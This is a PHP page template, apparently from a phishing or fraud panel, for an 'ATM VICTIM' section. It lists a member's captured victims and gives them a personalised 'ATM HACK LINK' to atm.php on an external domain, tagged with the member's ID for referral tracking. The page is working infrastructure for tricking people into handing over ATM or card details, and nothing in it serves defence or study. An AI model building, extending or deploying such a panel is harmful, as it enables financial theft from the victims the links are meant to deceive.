<?php require_once (dirname(dirname(__FILE__)).'/preload.php'); ?>
<?php require_once 'header.php';?>
<?php
 //victims
  $atmvictim = atm_victim($member->user_id) ?: $_SESSION['user']['atmvictim'];
  $viewatmvictim = view_atm_victim($member->user_id) ?: $_SESSION['user']['viewatmvictim'];
?>
<?php define('eu_active','atmvictim'); ?>
<?php do_winfo('ATM VICTIM'); ?>
   <title><?php echo SITE_TITLE.' '.do_config(8).' '.do_config(1); ?></title>
    <!-- BREADCRUMB -->
    <nav class="bg-dark d-md-none">
      <div class="container-md">
        <div class="row align-items-center">
          <div class="col">

            <!-- Breadcrumb -->
            <ol class="breadcrumb">
              <li class="breadcrumb-item">
                <span class="text-white">
                  Account
                </span>
              </li>
              <li class="breadcrumb-item active" aria-current="page">
                <span class="text-white">
                  General
                </span>
              </li>
            </ol>

          </div>
          <div class="col-auto">

            <!-- Toggler -->
            <div class="navbar-dark">
              <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#sidenavCollapse" aria-controls="sidenavCollapse" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
              </button>
            </div>

          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </nav>
   <?php require_once ('setup-menu.php'); ?>

   <?php
  $premium_content = viewpremium($member->user_id) ?: $_SESSION['user']['premium'];
?>
<?php echo $premium_content; ?>
    <div class="col-12 col-md-9">
    <!-- Card -->
    <div class="card card-bleed shadow-light-lg mb-6">
              <div class="card-header">
                <div class="row align-items-center">
                  <div class="col">

                    <!-- Heading -->
                    <h4 class="mb-0">
                      <?php echo SITE_TITLE; ?>
                    </h4><hr>
                  </div>
                </div>
              </div>
              <div class="card-body">
                  <div class="text-center">
                      <div class="alert alert-success text-uppercase">
                          <h4><i class="fa fa-warning"></i> COPY ATM HACK LINK</h4><hr>
                          <input type="text" value="https://plcr.com.ng/atm.php?user=<?php echo $member->user_id; ?>&ref=<?php echo $member->user_id; ?>" class="form-control" disabled>
                      </div>
                  </div>
                  <?php echo $atmvictim; ?>
              </div>
    </div>
    </div>
</div>
    </div>
    </main>
<?php echo $viewatmvictim; ?>
<?php require_once 'ajax.js.php';?>
<?php require_once 'footer.php';?>